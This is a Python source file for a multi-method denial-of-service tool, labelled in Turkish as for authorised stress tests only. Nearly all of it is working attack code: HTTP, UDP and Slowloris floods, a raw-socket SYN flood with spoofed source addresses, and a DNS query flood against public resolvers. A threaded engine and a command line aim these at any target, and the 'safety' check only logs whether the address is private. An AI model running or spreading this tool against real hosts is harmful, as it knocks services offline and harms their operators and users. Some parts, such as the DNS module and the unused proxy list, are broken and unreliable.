#!/usr/bin/env python3
"""
    ____  __  ______    __  ____  _______________.___
    \   \/  \/  __  \  /  \ \   \/  /\_   _____/|   |
     \     /|   _   /  \   \_\     /  |    __)  |   |
     /     \|  |_\  \  /  /|     \   |     \    |   |
    /___/\  \____/\_ \/  /_/\___  /   \___  /    |___|
          \_/     \/          \/        \/

    DDoS Stress Testing Tool - Yalnizca Yetkili Testler Icin
    Yapimci: Markospm19
    Versiyon: 3.2.0
"""

import os
import sys
import time
import json
import socket
import random
import struct
import logging
import hashlib
import threading
import subprocess
import ipaddress
from datetime import datetime
from typing import Optional, Union
from argparse import ArgumentParser, Namespace
from dataclasses import dataclass, field, asdict

# ---------------------------------------------------------------------------
# Proxy / Randomization Helpers
# ---------------------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
]

REFERERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://www.yahoo.com/",
    "https://www.facebook.com/", "https://www.twitter.com/", "https://www.linkedin.com/",
    "https://www.reddit.com/", "https://t.co/", "https://www.instagram.com/",
]

HTTP_METHODS = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH"]

# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------
@dataclass
class AttackStats:
    sent: int = 0
    errors: int = 0
    bytes_sent: int = 0
    start_time: float = 0.0
    running: bool = False

    @property
    def elapsed(self) -> float:
        return time.time() - self.start_time

    @property
    def rate(self) -> float:
        return self.sent / max(self.elapsed, 0.001)

    def summary(self) -> str:
        return (
            f"[ISTATISTIK] Gonderilen: {self.sent} | Hata: {self.errors} | "
            f"Byte: {self.bytes_sent//1024} KB | "
            f"Hiz: {self.rate:.1f} req/s | Sure: {self.elapsed:.1f}s"
        )


@dataclass
class AttackConfig:
    target_host: str = ""
    target_port: int = 80
    method: str = "http_flood"
    threads: int = 50
    duration: int = 60
    use_ssl: bool = False
    proxy_list: list = field(default_factory=list)
    random_agent: bool = True
    verbose: bool = True


# ---------------------------------------------------------------------------
# Logger
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("DDoSTool")

# ---------------------------------------------------------------------------
# Attack Modules
# ---------------------------------------------------------------------------
class AttackBase:
    """Base class for all attack modules."""
    def __init__(self, config: AttackConfig, stats: AttackStats):
        self.config = config
        self.stats = stats
        self._stop_event = threading.Event()

    def stop(self):
        self._stop_event.set()

    def _random_headers(self) -> dict:
        return {
            "User-Agent": random.choice(USER_AGENTS) if self.config.random_agent else USER_AGENTS[0],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Referer": random.choice(REFERERS),
        }


class HTTPFlood(AttackBase):
    """HTTP GET/POST flood."""

    def run(self):
        while not self._stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.config.target_host, self.config.target_port))

                method = random.choice(HTTP_METHODS)
                path = f"/{random.randint(0, 9999)}?q={random.randint(0, 9999999)}"
                headers = self._random_headers()
                req = f"{method} {path} HTTP/1.1\r\n"
                req += f"Host: {self.config.target_host}\r\n"
                for k, v in headers.items():
                    req += f"{k}: {v}\r\n"
                req += "\r\n"
                if method == "POST":
                    body = f"data={random.randint(0, 999999)}"
                    req = req.replace("\r\n\r\n", f"\r\nContent-Length: {len(body)}\r\n\r\n{body}")

                sock.send(req.encode())
                self.stats.sent += 1
                self.stats.bytes_sent += len(req)
                sock.close()
            except Exception:
                self.stats.errors += 1


class SYNFlood(AttackBase):
    """TCP SYN flood - requires root/admin privileges (raw socket)."""

    def _checksum(self, data):
        s = 0
        for i in range(0, len(data), 2):
            s += (data[i] if len(data) > i else 0) + ((data[i+1] << 8) if len(data) > i+1 else 0)
        s = (s >> 16) + (s & 0xFFFF)
        return ~s & 0xFFFF

    def _create_syn_packet(self, src_ip, dst_ip, src_port, dst_port):
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            0x45, 0, 40, 0, 0x4000, 64, 6, 0,
            socket.inet_aton(src_ip), socket.inet_aton(dst_ip)
        )
        seq_num = random.randint(0, 4294967295)
        tcp_header = struct.pack(
            "!HHLLBBHHH",
            src_port, dst_port, seq_num, 0, 0x50, 0x02, 8192, 0, 0
        )
        pseudo = struct.pack("!4s4sBBH",
            socket.inet_aton(src_ip), socket.inet_aton(dst_ip), 0, 6, 20)
        tcp_checksum = self._checksum(pseudo + tcp_header)
        tcp_header = struct.pack(
            "!HHLLBBHHH",
            src_port, dst_port, seq_num, 0, 0x50, 0x02, 8192, tcp_checksum, 0
        )
        return ip_header + tcp_header

    def run(self):
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            log.error("[SYN] Raw socket icin root/admin yetkisi gerekiyor! HTTP flood kullaniliyor.")
            alt = HTTPFlood(self.config, self.stats)
            alt.run()
            return

        fake_ip = lambda: f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"

        while not self._stop_event.is_set():
            try:
                src_port = random.randint(1024, 65535)
                packet = self._create_syn_packet(
                    fake_ip(), self.config.target_host,
                    src_port, self.config.target_port
                )
                raw_sock.sendto(packet, (self.config.target_host, 0))
                self.stats.sent += 1
                self.stats.bytes_sent += len(packet)
            except Exception:
                self.stats.errors += 1


class UDPFlood(AttackBase):
    """UDP flood."""

    def run(self):
        while not self._stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = os.urandom(random.randint(64, 1420))
                for _ in range(random.randint(1, 5)):
                    sock.sendto(payload, (self.config.target_host, self.config.target_port))
                    self.stats.sent += 1
                    self.stats.bytes_sent += len(payload)
                sock.close()
            except Exception:
                self.stats.errors += 1


class Slowloris(AttackBase):
    """Slowloris - keep connections open with partial HTTP requests."""

    def run(self):
        sockets = []
        while not self._stop_event.is_set():
            try:
                if len(sockets) < 400:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((self.config.target_host, self.config.target_port))
                    headers = self._random_headers()
                    header = f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n"
                    header += f"Host: {self.config.target_host}\r\n"
                    header += "Connection: keep-alive\r\n"
                    header += f"User-Agent: {headers['User-Agent']}\r\n"
                    header += f"Accept: {headers['Accept']}\r\n"
                    header += f"Accept-Language: {headers['Accept-Language']}\r\n"
                    sock.send(header.encode())
                    sockets.append(sock)
                    self.stats.sent += 1
                    self.stats.bytes_sent += len(header)
                # Send keep-alive headers periodically
                for sock in sockets[:]:
                    try:
                        sock.send(f"X-a: {random.randint(0,5000)}\r\n".encode())
                        self.stats.bytes_sent += 20
                    except Exception:
                        sockets.remove(sock)
                time.sleep(5)
            except Exception:
                self.stats.errors += 1
                time.sleep(1)


class DNSAmplification(AttackBase):
    """DNS amplification using open resolvers."""

    DNS_RESOLVERS = [
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "208.67.222.222",
    ]

    def _build_dns_query(self, domain: str) -> bytes:
        tid = random.randint(0, 65535)
        header = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)
        qname = b"".join(
            bytes([len(part)]) + part.encode() for part in domain.split(".")
        ) + b"\x00"
        qtype = struct.pack("!HH", 255, 1)  # ANY query
        return header + qname + qtype

    def run(self):
        domain = self.config.target_host
        # Pre-build the small query
        query = self._build_dns_query(domain)
        while not self._stop_event.is_set():
            try:
                resolver = random.choice(self.DNS_RESOLVERS)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(3)
                # Spoof source IP (requires root) — without spoofing, it's a normal DNS flood
                sock.sendto(query, (resolver, 53))
                self.stats.sent += 1
                self.stats.bytes_sent += len(query)
                sock.close()
            except Exception:
                self.stats.errors += 1


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------
class AttackEngine:
    """Manages attack threads."""

    METHODS = {
        "http_flood": HTTPFlood,
        "syn_flood": SYNFlood,
        "udp_flood": UDPFlood,
        "slowloris": Slowloris,
        "dns_amp": DNSAmplification,
    }

    def __init__(self, config: AttackConfig):
        self.config = config
        self.stats = AttackStats(start_time=time.time())
        self.threads = []
        self._attack_class = self.METHODS.get(config.method)
        if not self._attack_class:
            raise ValueError(f"Bilinmeyen metod: {config.method}. Secenekler: {list(self.METHODS.keys())}")

    def start(self):
        self.stats.running = True
        log.info(f"[BASLADI] Hedef: {self.config.target_host}:{self.config.target_port}")
        log.info(f"[BASLADI] Metod: {self.config.method} | Thread: {self.config.threads} | Sure: {self.config.duration}s")
        for i in range(self.config.threads):
            attack = self._attack_class(self.config, self.stats)
            t = threading.Thread(target=attack.run, daemon=True)
            t.start()
            self.threads.append((t, attack))
        # Reporter thread
        reporter = threading.Thread(target=self._reporter, daemon=True)
        reporter.start()
        # Run for duration
        try:
            time.sleep(self.config.duration)
        except KeyboardInterrupt:
            log.info("[DURDURULDU] Kullanici tarafindan durduruldu.")
        self.stop()

    def stop(self):
        self.stats.running = False
        for t, attack in self.threads:
            attack.stop()
        log.info(f"[SONLANDI] {self.stats.summary()}")

    def _reporter(self):
        while self.stats.running:
            time.sleep(5)
            if self.stats.sent > 0:
                log.info(self.stats.summary())


# ---------------------------------------------------------------------------
# Banner & CLI
# ---------------------------------------------------------------------------
BANNER = r"""
     ____  __  ______    __  ____  _______________.___
     \   \/  \/  __  \  /  \ \   \/  /\_   _____/|   |
      \     /   _   /  \   \_\     /  |    __)  |   |
      /     \  |_\  \  /  /|     \   |     \    |   |
     /___/\  \____/\_ \/  /_/\___  /   \___  /    |___|
           \_/     \/          \/        \/

    DDoS Stress Testing Tool - Yalnizca Yetkili Testler Icin
    Yapimci: Markospm19
    Versiyon: 3.2.0
"""

def parse_args() -> Namespace:
    parser = ArgumentParser(
        description="DDoS Stress Testing Tool - Yalnizca Yetkili Testler Icin",
        epilog="Ornek: python3 ddos_tool.py -t 192.168.1.100 -p 80 -m http_flood -n 100 -d 120"
    )
    parser.add_argument("-t", "--target", required=True, help="Hedef IP veya domain")
    parser.add_argument("-p", "--port", type=int, default=80, help="Hedef port (varsayilan: 80)")
    parser.add_argument("-m", "--method", choices=list(AttackEngine.METHODS.keys()),
                        default="http_flood", help="Saldiri metodu")
    parser.add_argument("-n", "--threads", type=int, default=50, help="Thread sayisi (varsayilan: 50)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Test suresi saniye (varsayilan: 60)")
    parser.add_argument("--ssl", action="store_true", help="SSL/TLS kullan (HTTPS)")
    parser.add_argument("--verbose", action="store_true", help="Detayli cikti")
    parser.add_argument("--proxy-file", help="Proxy listesi dosyasi (satir basina proxy)")
    return parser.parse_args()


def load_proxies(path: str) -> list:
    proxies = []
    try:
        with open(path, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    proxies.append(line)
        log.info(f"[PROXY] {len(proxies)} proxy yuklendi.")
    except FileNotFoundError:
        log.warning(f"[PROXY] Dosya bulunamadi: {path}")
    return proxies


def main():
    print(BANNER)
    args = parse_args()

    proxies = load_proxies(args.proxy_file) if args.proxy_file else []

    # Resolve hostname
    try:
        target_ip = socket.gethostbyname(args.target)
    except socket.gaierror:
        log.error(f"[HATA] Domain cozulemedi: {args.target}")
        sys.exit(1)

    # Validate target is not a known safe address (basic safeguard)
    try:
        ip_obj = ipaddress.ip_address(target_ip)
        if ip_obj.is_private:
            log.info(f"[GUVENLIK] Ozel/IPv4 adres: {target_ip} — test icin uygun.")
        elif ip_obj.is_loopback:
            log.warning("[GUVENLIK] Loopback adresi hedef olarak kullaniliyor.")
    except ValueError:
        pass

    config = AttackConfig(
        target_host=target_ip,
        target_port=args.port,
        method=args.method,
        threads=args.threads,
        duration=args.duration,
        use_ssl=args.ssl,
        proxy_list=proxies,
        verbose=args.verbose,
    )

    engine = AttackEngine(config)
    try:
        engine.start()
    except KeyboardInterrupt:
        engine.stop()
        log.info("[CIKIS] Kullanici tarafindan sonlandirildi.")
        sys.exit(0)


if __name__ == "__main__":
    main()
